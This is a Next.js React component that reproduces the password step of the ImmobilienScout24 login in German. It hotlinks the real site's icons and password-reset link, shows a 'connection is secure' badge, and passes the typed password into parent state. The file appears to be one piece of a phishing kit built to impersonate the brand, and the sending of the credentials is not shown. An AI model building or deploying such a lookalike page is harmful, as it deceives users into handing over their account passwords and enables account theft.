import styles from "../../styles/Home.module.css";
import Link from "next/link";

function PassForm({ checkOut, setCheckOut, seePass, setSeePass, removeChange, data, handleChange  }) {
  return (
    <>
      <span className={styles.formTitlePass}>
        <img onClick={removeChange} className={styles.arrow} src="https://sso.immobilienscout24.de/img/icn_arrow_left.svg" />
        <span className={styles.txtFormPass}>Anmelden</span>
      </span>

      <div className={styles.passEmail}>
        <img className={styles.emailIcon} src="https://sso.immobilienscout24.de/img/icn_user.svg" />
        <span className={styles.emailTxt}>{data.email}</span>
      </div>

      <label className={styles.emailLable}>Passwort</label>
      <div className={styles.passContainer}>
        <span onClick={() => setSeePass(prev => !prev)} className={styles.passClick}>{seePass ? "AUSBLENDEN" : "ANZEIGEN"}</span>
        <input
            type={seePass ? "text" : "password"}
            name="password"
          autoFocus
          value={data.password}
          onChange={handleChange}
          className={`${styles.emailInput} ${styles.inputPass}`}
          />
      </div>
      <button className={styles.emailBtn}>Anmelden</button>
      <div className={styles.passRestFormDiv}>
        {
          checkOut ? <img onClick={() => setCheckOut(prev => !prev)} className={styles.inputCheckedPhoto} src="/check.png" /> : <input
          type="checkbox"
          className={styles.inputChecked}
          onChange={() => setCheckOut(prev => !prev)}
        />
        }
        
        <span className={styles.txtTwooo}>Angemeldet bleiben</span>

        <Link className={styles.resetLinkTwo} href="https://sso.immobilienscout24.de/sso/forgotPassword?appName=is24main&source=meinkontodropdown-login&sso_return=https%3A%2F%2Fwww.immobilienscout24.de%2Fsso%2Flogin.go%3Fsource%3Dmeinkontodropdown-login%26returnUrl%3D%2Fgeschlossenerbereich%2Fstart.html%3Fsource%253Dmeinkontodropdown-login">Passwort vergessen?</Link>  
      </div>

      <span className={`${styles.backMess} ${styles.backTwo}`}><img src='https://sso.immobilienscout24.de/img/icn_lock.svg'/> <span className={styles.backMessText}>Diese Verbindung ist sicher.</span></span>
      </>
  )
}

export default PassForm;